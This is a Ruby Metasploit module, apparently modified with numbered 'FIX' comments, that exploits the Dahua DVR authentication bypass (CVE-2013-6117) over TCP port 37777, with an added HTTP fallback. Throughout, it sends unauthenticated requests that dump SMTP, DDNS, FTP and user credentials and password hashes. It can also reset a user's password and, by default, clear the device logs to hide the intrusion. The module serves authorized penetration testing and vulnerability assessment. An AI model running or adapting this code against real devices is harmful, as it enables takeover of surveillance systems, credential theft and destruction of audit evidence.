##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Dahua DVR Auth Bypass Scanner',
      'Description' => "Scans for Dahua-based DVRs and grabs settings via the binary TCP protocol (CVE-2013-6117, port 37777) and optionally via HTTP for newer firmware (port 80/443). Optionally resets a user's password and clears the device logs.",
      'Author'      => [
        'Tyler Bennett - Talos Consulting', # Metasploit module
        'Jake Reynolds - Depth Security',   # Vulnerability Discoverer
        'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module
        'Nathan McBride'                    # regex extraordinaire
      ],
      'References'  => [
        [ 'CVE', '2013-6117' ],
        [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
      ],
      'License'       => MSF_LICENSE,
      'DefaultAction' => 'VERSION',
      'Actions'       => [
        [ 'CHANNEL', { 'Description' => 'Obtain the channel/camera information from the DVR' } ],
        [ 'DDNS',    { 'Description' => 'Obtain the DDNS settings from the DVR' } ],
        [ 'EMAIL',   { 'Description' => 'Obtain the email settings from the DVR' } ],
        [ 'GROUP',   { 'Description' => 'Obtain the group information the DVR' } ],
        [ 'NAS',     { 'Description' => 'Obtain the NAS settings from the DVR' } ],
        [ 'RESET',   { 'Description' => "Reset an existing user's password on the DVR" } ],
        [ 'SERIAL',  { 'Description' => 'Obtain the serial number from the DVR' } ],
        [ 'USER',    { 'Description' => 'Obtain the user information from the DVR' } ],
        [ 'VERSION', { 'Description' => 'Obtain the version of the DVR' } ]
      ]
    )

    register_options([
      OptString.new('USERNAME',      [false, 'A username to reset', '888888']),
      OptString.new('PASSWORD',      [false, 'A password to reset the user with; random if not set']),
      OptBool.new('CLEAR_LOGS',     [true,  "Clear the DVR logs when we're done?", true]),
      OptInt.new('TIMEOUT',         [true,  'Timeout in seconds for socket reads', 10]),
      OptBool.new('HTTP_FALLBACK',  [false, 'Also probe HTTP interface for newer Dahua firmware', false]),
      OptInt.new('HTTP_PORT',       [false, 'Port for HTTP fallback probe', 80]),
      OptBool.new('HTTP_SSL',       [false, 'Use HTTPS for HTTP fallback', false]),
      Opt::RPORT(37777)
    ])
  end

  # HTTP signatures present in Dahua web interface headers or response bodies
  DAHUA_HTTP_SIGS = [
    /Dahua-Webs/i,   # Server header on most Dahua firmware
    /DHttp/i,        # Alternate Dahua server header
    /DH_WEB/i,       # Body marker in older web UI
    /webLogin/i,     # Login page JS reference
    /"session"\s*:/i # JSON-RPC session field in login challenge
  ].freeze

  # Unauthenticated CGI endpoints known to expose data on unpatched firmware
  DAHUA_HTTP_PATHS = {
    users:  '/cgi-bin/userManager.cgi?action=getUserInfoAll',
    config: '/cgi-bin/configManager.cgi?action=getConfig&name=General'
  }.freeze

  # FIX: binary constant strings kept as-is; only logic that uses them is fixed below
  U1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  DVR_RESP = "\xb1\x00\x00\x58\x00\x00\x00\x00"

  VERSION = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  EMAIL   = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
            "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  DDNS    = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
            "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  NAS     = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
            "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  CHANNELS = "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  GROUPS  = "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  USERS   = "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  SN      = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  CLEAR_LOGS1 = "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  CLEAR_LOGS2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

  def setup
    @password = datastore['PASSWORD']
    @password ||= Rex::Text.rand_text_alpha(6)
  end

  # FIX #10: centralised read with configurable timeout instead of bare get_once calls
  def read_response
    sock.get_once(-1, datastore['TIMEOUT'])
  end

  # FIX #7: scanner auxiliary modules use check_host (not check) for per-host check support
  # FIX #8: fingerprint uses its own connect/disconnect, not shared with action methods
  def check_host(_ip)
    connect
    sock.put(U1)
    data = sock.recv(8)
    if data == DVR_RESP
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET
    Exploit::CheckCode::Unknown
  ensure
    disconnect
  end

  def dahua_fingerprint
    connect
    sock.put(U1)
    data = sock.recv(8)
    data == DVR_RESP
  rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e
    vprint_error("#{peer} -- connection error: #{e.message}")
    false
  ensure
    disconnect
  end

  # FIX #1: nil guard on read_response added; FIX #10: timeout via read_response
  def grab_version
    connect
    sock.put(VERSION)
    data = read_response
    return unless data && data =~ /[\x00]{8,}([[:print:]]+)/
    print_good("#{peer} -- version: #{Regexp.last_match[1]}")
  ensure
    disconnect
  end

  def grab_serial
    connect
    sock.put(SN)
    data = read_response
    return unless data && data =~ /[\x00]{8,}([[:print:]]+)/
    print_good("#{peer} -- serial number: #{Regexp.last_match[1]}")
  ensure
    disconnect
  end

  # FIX #4: inverted reporting condition corrected (was only reporting when all fields blank)
  def grab_email
    connect
    sock.put(EMAIL)
    response = read_response
    return unless response

    data = response.split('&&')
    print_good("#{peer} -- Email Settings:")
    return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i

    mailhost   = Regexp.last_match[1].split(':')
    mailserver = mailhost[0].to_s
    mailport   = mailhost[1].to_s
    muser      = data[5].to_s
    mpass      = data[6].to_s

    print_status("#{peer} --  Server: #{mailserver}")          unless mailserver.blank?
    print_status("#{peer} --  Server Port: #{mailport}")       unless mailport.blank?
    print_status("#{peer} --  Destination Email: #{data[1]}") unless data[1].to_s.blank?

    unless muser.blank? || mpass.blank?
      print_good("#{peer} --  SMTP User: #{muser}")
      print_good("#{peer} --  SMTP Password: #{mpass}")
    end

    # FIX #4: was `unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?`
    # (AND means it only reported when ALL were blank — logically inverted)
    report_email_cred(mailserver, mailport, muser, mpass) unless mailserver.blank? || mailport.blank? || muser.blank? || mpass.blank?
  ensure
    disconnect
  end

  # FIX #9: replaced manual datastore['VERBOSE'] check with vprint_line
  def grab_ddns
    connect
    sock.put(DDNS)
    response = read_response
    return unless response

    data = response.split(/&&[0-1]&&/)
    ddns_table = Rex::Text::Table.new(
      'Header'  => 'Dahua DDNS Settings',
      'Indent'  => 1,
      'Columns' => ['Peer', 'DDNS Service', 'DDNS Server', 'DDNS Port', 'Domain', 'Username', 'Password']
    )
    data.each_with_index do |val, index|
      next if index == 0
      val         = val.split('&&')
      ddns_service = val[0].to_s
      ddns_server  = val[1].to_s
      ddns_port    = val[2].to_s
      ddns_domain  = val[3].to_s
      ddns_user    = val[4].to_s
      ddns_pass    = val[5].to_s
      ddns_table << [peer, ddns_service, ddns_server, ddns_port, ddns_domain, ddns_user, ddns_pass]
      unless ddns_server.blank? || ddns_port.blank? || ddns_user.blank? || ddns_pass.blank?
        report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
      end
    end
    vprint_line(ddns_table.to_s)
  ensure
    disconnect
  end

  # FIX #3: broken character class [\x0-9a-f] corrected to [\x00-\x09\xa-\xf] (IP/port bytes)
  # FIX #6: replaced non-existent report_creds call with report_nas_cred using create_credential_login
  def grab_nas
    connect
    sock.put(NAS)
    data = read_response
    return unless data

    print_good("#{peer} -- NAS Settings:")
    server = ''
    port   = ''

    # FIX #3: was [\x0-9a-f] which is an invalid character class range
    if data =~ /[\x00]{8,}[\x01][\x00]{3}([\x00-\xff]{4})([\x00-\xff]{2})/
      server = Regexp.last_match[1].unpack('C*').join('.')
      port   = Regexp.last_match[2].unpack1('S').to_s
    end

    if /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/ =~ data
      ftpuser.strip!
      ftppass.strip!
      unless ftpuser.blank? || ftppass.blank?
        print_good("#{peer} --  NAS Server: #{server}")
        print_good("#{peer} --  NAS Port: #{port}")
        print_good("#{peer} -- FTP User: #{ftpuser}")
        print_good("#{peer} -- FTP Pass: #{ftppass}")
        # FIX #6: was `report_creds(...)` which doesn't exist in MSF API
        report_nas_cred(server, port, ftpuser, ftppass)
      end
    end
  ensure
    disconnect
  end

  # FIX #1: nil guard added before split so NoMethodError can't occur
  def grab_channels
    connect
    sock.put(CHANNELS)
    response = read_response
    return unless response

    data = response.split('&&')
    return unless data.length > 1

    channels_table = Rex::Text::Table.new(
      'Header'  => 'Dahua Camera Channels',
      'Indent'  => 1,
      'Columns' => ['ID', 'Peer', 'Channels']
    )
    data.each_with_index do |val, index|
      channels = val[/([[:print:]]+)/]
      channels_table << [index.to_s, peer, channels]
    end
    channels_table.print
  ensure
    disconnect
  end

  # FIX #2: nil guard on regex match; was crashing with NoMethodError when captures was called on nil
  def grab_users
    connect
    sock.put(USERS)
    response = read_response
    return unless response

    data = response.split('&&')
    users_table = Rex::Text::Table.new(
      'Header'  => 'Dahua Users Hashes and Rights',
      'Indent'  => 1,
      'Columns' => ['Peer', 'Username', 'Password Hash', 'Groups', 'Permissions', 'Description']
    )
    data.each do |val|
      match = val.match(/^.*:(.*):(.*):(.*):(.*):(.*):(.*)$/)
      next unless match   # FIX #2: was match.captures without nil check

      user, md5hash, groups, rights, name = match.captures
      users_table << [peer, user, md5hash, groups, rights, name]

      hash = "#{rhost} #{user}:$dahua$#{md5hash}"
      report_hash(rhost, rport, user, hash)
      report_vuln(
        host:  rhost,
        port:  rport,
        proto: 'tcp',
        sname: 'dvr',
        name:  'Dahua Authentication Password Hash Exposure',
        info:  "Obtained password hash for user #{user}: #{md5hash}",
        refs:  references
      )
    end
    users_table.print
  ensure
    disconnect
  end

  def grab_groups
    connect
    sock.put(GROUPS)
    response = read_response
    return unless response

    data = response.split('&&')
    groups_table = Rex::Text::Table.new(
      'Header'  => 'Dahua groups',
      'Indent'  => 1,
      'Columns' => ['ID', 'Peer', 'Group']
    )
    data.each do |val|
      number = val[/(([\d]+))/].to_s
      group  = val[/(([a-z]+))/].to_s
      groups_table << [number, peer, group]
    end
    groups_table.print
  ensure
    disconnect
  end

  # FIX #5: length byte overflow — added bounds check and safe pack instead of .chr
  def reset_user
    connect
    userstring = "#{datastore['USERNAME']}:Intel:#{@password}:#{@password}"

    # FIX #5: original `userstring.length.chr` raises RangeError above 255 (or wraps silently with pack)
    if userstring.length > 255
      print_error("#{peer} -- Userstring too long (#{userstring.length} bytes); shorten USERNAME or PASSWORD")
      return
    end

    u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    len_byte = [userstring.length].pack('C')
    u3 = "\xa6\x00\x00\x00" + len_byte +
         "\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
         userstring

    sock.put(u1)
    sock.put(u2)
    sock.put(u3)
    read_response
    sock.put(u1)
    return unless read_response

    print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
  ensure
    disconnect
  end

  def clear_logs
    connect
    sock.put(CLEAR_LOGS1)
    sock.put(CLEAR_LOGS2)
    print_good("#{peer} -- logs cleared")
  ensure
    disconnect
  end

  def peer
    "#{rhost}:#{rport}"
  end

  # ---------------------------------------------------------------------------
  # HTTP fallback — newer Dahua firmware (port 80/443)
  # ---------------------------------------------------------------------------

  def http_peer(ip)
    "#{ip}:#{datastore['HTTP_PORT']}"
  end

  def http_client(ip)
    Rex::Proto::Http::Client.new(
      ip,
      datastore['HTTP_PORT'].to_i,
      {},
      datastore['HTTP_SSL'],
      nil,
      nil
    )
  end

  # Single HTTP GET; returns Rex::Proto::Http::Response or nil on error.
  def http_request(ip, uri)
    cli = http_client(ip)
    begin
      cli.connect(datastore['TIMEOUT'])
      req  = cli.request_raw(
        'method'  => 'GET',
        'uri'     => uri,
        'headers' => { 'Connection' => 'close' }
      )
      cli.send_recv(req, datastore['TIMEOUT'])
    rescue ::Rex::ConnectionError, ::EOFError, ::Timeout::Error => e
      vprint_error("#{http_peer(ip)} -- HTTP error: #{e.message}")
      nil
    ensure
      cli.close rescue nil
    end
  end

  # Returns true if any Dahua signature is found in the response.
  # Checks / first (server header), then /cgi-bin/global.login (JSON challenge).
  def http_fingerprint(ip)
    [
      '/',
      '/cgi-bin/global.login'
    ].any? do |path|
      resp = http_request(ip, path)
      next false unless resp
      DAHUA_HTTP_SIGS.any? { |sig| resp.to_s =~ sig }
    end
  end

  # Attempts unauthenticated user list extraction.
  # Vulnerable on Dahua firmware that did not apply the 2021 patch.
  # Response format: users[N].Name=<user>\r\nusers[N].Password=<pass>\r\n
  def http_get_users(ip)
    resp = http_request(ip, DAHUA_HTTP_PATHS[:users])
    return unless resp && resp.code == 200 && resp.body =~ /\.Name=/

    hp = http_peer(ip)
    print_good("#{hp} -- Unauthenticated user list via HTTP (auth bypass confirmed)")

    users_table = Rex::Text::Table.new(
      'Header'  => 'Dahua HTTP Users',
      'Indent'  => 1,
      'Columns' => ['Host', 'Username', 'Password']
    )

    resp.body.scan(/users\[(\d+)\]\.Name=([^\r\n]+)/) do |idx, uname|
      uname.strip!
      pmatch = resp.body.match(/users\[#{Regexp.escape(idx)}\]\.Password=([^\r\n]+)/)
      pass   = pmatch ? pmatch[1].strip : ''

      users_table << [hp, uname, pass]
      next if uname.empty? || pass.empty?

      report_http_cred(ip, datastore['HTTP_PORT'], uname, pass)
      report_vuln(
        host:  ip,
        port:  datastore['HTTP_PORT'],
        proto: 'tcp',
        sname: datastore['HTTP_SSL'] ? 'https' : 'http',
        name:  'Dahua DVR Unauthenticated Credential Exposure via HTTP',
        info:  "Obtained credentials for user #{uname} via unauthenticated HTTP endpoint",
        refs:  references
      )
    end
    users_table.print
  end

  # Attempts unauthenticated general config fetch.
  # Some firmware exposes this without auth; response lines are table.General.*=value.
  def http_get_config(ip)
    resp = http_request(ip, DAHUA_HTTP_PATHS[:config])
    return unless resp && resp.code == 200 && resp.body =~ /table\./

    print_good("#{http_peer(ip)} -- Unauthenticated config access via HTTP")
    print_status(resp.body.strip)
  end

  # Entry point for the HTTP probe — fingerprint first, then attempt data extraction.
  def http_probe(ip)
    hp = http_peer(ip)
    unless http_fingerprint(ip)
      vprint_status("#{hp} -- No Dahua HTTP interface detected")
      return
    end

    print_good("#{hp} -- Dahua web interface detected (HTTP)")
    report_service(
      host:  ip,
      port:  datastore['HTTP_PORT'],
      proto: 'tcp',
      sname: datastore['HTTP_SSL'] ? 'https' : 'http',
      info:  'Dahua DVR HTTP interface'
    )

    http_get_users(ip)
    http_get_config(ip)
  end

  def report_http_cred(ip, port, user, pass)
    service_data = {
      address:      ip,
      port:         port,
      service_name: datastore['HTTP_SSL'] ? 'https' : 'http',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type:     :service,
      private_data:    pass,
      private_type:    :password,
      username:        user
    }.merge(service_data)
    create_credential_login({
      core:   create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data))
  end

  # ---------------------------------------------------------------------------

  # FIX #8: run_host no longer calls connect/disconnect itself; dahua_fingerprint handles its
  # own connection, and each action method manages its own connection via ensure blocks.
  # This eliminates the double-connect issue where run_host's ensure disconnect could fire
  # while an action method's socket was still open.
  def run_host(ip)
    # TCP binary protocol (CVE-2013-6117, port 37777)
    if dahua_fingerprint
      print_good("#{peer} -- Dahua DVR found (TCP/#{rport})")
      report_service(host: rhost, port: rport, sname: 'dvr', info: 'Dahua-based DVR (TCP)')

      case action.name.upcase
      when 'CHANNEL' then grab_channels
      when 'DDNS'    then grab_ddns
      when 'EMAIL'   then grab_email
      when 'GROUP'   then grab_groups
      when 'NAS'     then grab_nas
      when 'RESET'   then reset_user
      when 'SERIAL'  then grab_serial
      when 'USER'    then grab_users
      when 'VERSION' then grab_version
      end

      clear_logs if datastore['CLEAR_LOGS']
    else
      vprint_status("#{peer} -- No Dahua TCP response on port #{rport}")
    end

    # HTTP fallback for newer Dahua firmware (opt-in via HTTP_FALLBACK)
    http_probe(ip) if datastore['HTTP_FALLBACK']
  end

  def report_hash(rhost, rport, user, hash)
    service_data = {
      address:      rhost,
      port:         rport,
      service_name: 'dahua_dvr',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type:     :service,
      private_data:    hash,
      private_type:    :nonreplayable_hash,
      jtr_format:      'dahua',  # FIX #12: was 'dahua_hash' which is not a valid JTR/hashcat format
      username:        user
    }.merge(service_data)
    create_credential_login({
      core:   create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data))
  end

  def report_ddns_cred(server, port, user, pass)
    service_data = {
      address:      server,
      port:         port,
      service_name: 'ddns',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type:     :service,
      private_data:    pass,
      private_type:    :password,
      username:        user
    }.merge(service_data)
    create_credential_login({
      core:   create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data))
  end

  def report_email_cred(server, port, user, pass)
    service_data = {
      address:      server,
      port:         port,
      service_name: 'smtp',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type:     :service,
      private_data:    pass,
      private_type:    :password,
      username:        user
    }.merge(service_data)
    create_credential_login({
      core:   create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data))
  end

  # FIX #6: new method replacing the non-existent report_creds call in grab_nas
  def report_nas_cred(server, port, user, pass)
    service_data = {
      address:      server,
      port:         port,
      service_name: 'ftp',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type:     :service,
      private_data:    pass,
      private_type:    :password,
      username:        user
    }.merge(service_data)
    create_credential_login({
      core:   create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data))
  end
end
